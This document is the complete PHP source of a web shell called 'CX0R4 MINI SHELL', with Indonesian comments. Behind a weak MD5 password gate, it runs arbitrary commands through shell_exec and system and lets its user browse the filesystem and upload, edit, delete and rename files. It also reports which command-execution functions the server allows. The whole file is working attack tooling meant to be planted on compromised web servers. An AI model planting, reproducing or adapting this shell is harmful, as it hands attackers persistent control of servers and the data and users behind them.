<?php
session_start();
ob_start();

// --- KONFIGURASI PASSWORD ---
$password_md5 = "5aba3d398a013157245e847d49f1702e"; // Ini hash dari 'admin123'
// ----------------------------

// Cek Logout
if (isset($_GET['logout'])) {
    unset($_SESSION['logged_in']);
    session_destroy();
    header("Location: ?");
    exit;
}

if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    if (isset($_POST['pass'])) {
        if (md5($_POST['pass']) === $password_md5) {
            $_SESSION['logged_in'] = true;
            header("Location: ?dir=" . urlencode(getcwd()));
            exit;
        } else {
            $error = "Password Salah njing!";
        }
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>LOGIN - CX0R4</title>
        <style>
            body { background: #000; color: #00d4ff; font-family: 'Courier New'; text-align: center; padding-top: 15%; }
            input { background: #111; border: 1px solid #00d4ff; color: #fff; padding: 10px; width: 250px; text-align: center; }
            button { background: #00d4ff; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; }
        </style>
    </head>
    <body>
        <h2>&lt; LOGIN CX0R4 &gt;</h2>
        <form method="POST">
            <input type="password" name="pass" placeholder="Enter Password..."><br><br>
            <button type="submit">LOGIN</button>
        </form>
        <?php if(isset($error)) echo "<p style='color:red'>$error</p>"; ?>
    </body>
    </html>
    <?php
    exit;
}

$path = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$path = str_replace('\\', '/', realpath($path));
if (file_exists($path)) { chdir($path); }

function dapatkan_chmod($file_path) {
    if (!file_exists($file_path)) return "-";
    return substr(sprintf('%o', fileperms($file_path)), -4);
}

if (isset($_POST['new_file'])) {
    $name = $_POST['filename'];
    if (!empty($name)) {
        file_put_contents($path . '/' . $name, "");
    }
    header("Location: ?dir=" . urlencode($path));
    exit;
}

if (isset($_POST['new_folder'])) {
    $name = $_POST['foldername'];
    if (!empty($name) && !file_exists($path . '/' . $name)) {
        mkdir($path . '/' . $name);
    }
    header("Location: ?dir=" . urlencode($path));
    exit;
}

if (isset($_GET['del'])) {
    $target = $path . '/' . $_GET['del'];
    if (file_exists($target)) {
        is_dir($target) ? rmdir($target) : unlink($target);
    }
    header("Location: ?dir=" . urlencode($path));
    exit;
}

if (isset($_POST['rename_obj'])) {
    $old = $path . '/' . $_POST['old_name'];
    $new = $path . '/' . $_POST['new_name'];
    if (!empty($_POST['new_name'])) {
        rename($old, $new);
    }
    header("Location: ?dir=" . urlencode($path));
    exit;
}

if (isset($_POST['save_file'])) {
    file_put_contents($path . '/' . $_POST['fname'], $_POST['file_content']);
    header("Location: ?dir=" . urlencode($path));
    exit;
}

if (isset($_FILES['up_file'])) {
    move_uploaded_file($_FILES['up_file']['tmp_name'], $path . '/' . $_FILES['up_file']['name']);
    header("Location: ?dir=" . urlencode($path));
    exit;
}

$cmd_result = "";
if (isset($_POST['exec_cmd']) && !empty($_POST['cmd'])) {
    $command = $_POST['cmd'];
    if (function_exists('shell_exec')) {
        $cmd_result = shell_exec($command . " 2>&1");
    } elseif (function_exists('system')) {
        ob_start(); system($command . " 2>&1"); $cmd_result = ob_get_contents(); ob_end_clean();
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CX0R4 - Shell</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Silkscreen:wght@700&family=Inter:wght@400;700&display=swap');
        body { 
            background: #000 url('https://4kwallpapers.com/images/walls/thumbs_3t/26545.png') no-repeat center center fixed;
            background-size: cover; color: #fff; font-family: 'Inter', sans-serif; margin: 0; padding: 20px; font-size: 13px;
        }
        .header { font-family: 'Silkscreen', cursive; font-size: 35px; color: #00d4ff; text-align: center; margin-bottom: 25px; text-shadow: 0 0 15px #00d4ff; }
        .container { background: rgba(5, 15, 30, 0.85); border: 1px solid rgba(0, 212, 255, 0.3); padding: 20px; margin-bottom: 20px; border-radius: 4px; }
        .cmd-box { background: #000; color: #39ff14; padding: 10px; border: 1px solid #333; margin-top: 10px; white-space: pre-wrap; font-family: monospace; max-height: 250px; overflow-y: auto; }
        .input-cmd, .input-mini { background: rgba(0,0,0,0.5); border: 1px solid #00d4ff; color: #fff; padding: 8px; outline: none; }
        .btn-action { background: #0044cc; color: white; border: none; padding: 6px 15px; cursor: pointer; border-radius: 3px; font-weight: bold; }
        .btn-action:hover { background: #00d4ff; color: #000; }
        table { width: 100%; border-collapse: collapse; }
        th { color: #888; text-align: left; padding: 10px; border-bottom: 1px solid rgba(0, 212, 255, 0.2); }
        td { padding: 10px; border-bottom: 1px solid rgba(255, 255, 255, 0.05); }
        .dir-label { color: #00d4ff; font-weight: bold; text-decoration: none; }
        .action-links a { color: #00d4ff; text-decoration: none; margin-right: 5px; }
        textarea { width: 100%; height: 300px; background: #000; color: #39ff14; border: 1px solid #333; font-family: monospace; padding: 10px; margin-top: 10px; }
    </style>
</head>
<body>

<div class="header"> &lt; \ &gt; CX0R4 MINI SHELL &lt; \ &gt; </div>

<div class="container">
    <div style="margin-bottom: 15px;">Path: 
        <?php 
        $dirs = explode('/', rtrim($path, '/'));
        $acc = "";
        foreach ($dirs as $d) {
            if ($d == "" && strpos($path, '/') === 0) { echo '<a href="?dir=/" style="color:#00d4ff; text-decoration:none;">/</a> '; $acc = "/"; continue; }
            if ($d == "") continue;
            $acc = ($acc == "/") ? "/".$d : $acc."/".$d;
            echo '<a href="?dir='.urlencode($acc).'" style="color:#00d4ff; text-decoration:none;">'.$d.'</a> / ';
        }
        ?>
    </div>
    
    <div style="display: flex; gap: 10px; flex-wrap: wrap;">
        <form method="POST" enctype="multipart/form-data"><input type="file" name="up_file"> <button class="btn-action">Upload</button></form>
        <form method="POST"><input type="text" name="filename" class="input-mini" placeholder="newfile.txt"> <button name="new_file" class="btn-action">+ File</button></form>
        <form method="POST"><input type="text" name="foldername" class="input-mini" placeholder="newfolder"> <button name="new_folder" class="btn-action">+ Folder</button></form>
    </div>
</div>

<?php if (isset($_GET['edit'])): 
    $fedit = $_GET['edit'];
    $content = file_get_contents($path . '/' . $fedit);
?>
<div class="container">
    <div style="color: #00d4ff;">Editing: <?php echo htmlspecialchars($fedit); ?></div>
    <form method="POST">
        <input type="hidden" name="fname" value="<?php echo htmlspecialchars($fedit); ?>">
        <textarea name="file_content"><?php echo htmlspecialchars($content); ?></textarea><br>
        <button name="save_file" class="btn-action">SAVE</button>
        <a href="?dir=<?php echo urlencode($path); ?>" class="btn-action" style="background:#555; text-decoration:none;">CANCEL</a>
    </form>
</div>
<?php endif; ?>

<div style="display: flex; gap: 20px; flex-wrap: wrap;">
    <div class="container" style="flex: 1;">
        <div style="color:#00d4ff; margin-bottom:10px;">Status</div>
        <table>
            <?php foreach(['shell_exec','system','passthru'] as $f) echo "<tr><td>$f</td><td>".(function_exists($f)?"<span style='color:#39ff14'>ON</span>":"<span style='color:#ff3e3e'>OFF</span>")."</td></tr>"; ?>
        </table>
    </div>
    <div class="container" style="flex: 2;">
        <div style="color:#00d4ff; margin-bottom:10px;">Terminal</div>
        <form method="POST">
            <input type="text" name="cmd" class="input-cmd" style="width:70%" placeholder="Command...">
            <button name="exec_cmd" class="btn-action">Run</button>
        </form>
        <?php if($cmd_result) echo "<div class='cmd-box'>".htmlspecialchars($cmd_result)."</div>"; ?>
    </div>
</div>

<div class="container">
    <table>
        <tr><th>Name</th><th>Size</th><th>Perms</th><th>Action</th></tr>
        <tr><td colspan="4"><a href="?dir=<?php echo urlencode(dirname($path)); ?>" style="color:#00d4ff; text-decoration:none;">[ .. ] Back</a></td></tr>
        <?php
        $items = scandir($path);
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            $full = $path . '/' . $item;
            $is_dir = is_dir($full);
            $size = $is_dir ? "-" : round(filesize($full)/1024, 2)." KB";
            $perms = dapatkan_chmod($full);
            
            echo "<tr>
                <td>".($is_dir ? "<a href='?dir=".urlencode($full)."' class='dir-label'>[DIR] $item</a>" : "<span>$item</span>")."</td>
                <td>$size</td>
                <td><span style='color:#39ff14'>$perms</span></td>
                <td class='action-links'>
                    ".(!$is_dir ? "<a href='?dir=".urlencode($path)."&edit=".urlencode($item)."'>Edit</a> | " : "")."
                    <a href='?dir=".urlencode($path)."&del=".urlencode($item)."' style='color:#ff3e3e' onclick='return confirm(\"Hapus?\")'>Del</a> | 
                    <form method='POST' style='display:inline;'>
                        <input type='hidden' name='old_name' value='$item'>
                        <input type='text' name='new_name' class='input-mini' style='width:70px; padding:2px;' placeholder='Rename'>
                        <button name='rename_obj' class='btn-ok' style='background:#0044cc; color:#fff; border:none; cursor:pointer;'>OK</button>
                    </form>
                </td>
            </tr>";
        }
        ?>
    </table>
</div>

</body>
</html> 
